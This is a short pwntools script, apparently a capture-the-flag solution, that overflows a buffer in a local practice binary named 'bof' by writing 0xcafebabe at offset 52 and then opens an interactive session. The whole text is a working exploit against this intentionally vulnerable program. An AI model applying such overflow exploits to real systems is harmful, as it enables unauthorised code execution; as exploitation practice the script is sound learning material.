from pwn import *

context.binary = elf = ELF('./bof')

r = process('./bof')

r.sendline(flat({52: p32(0xcafebabe)}))
r.interactive()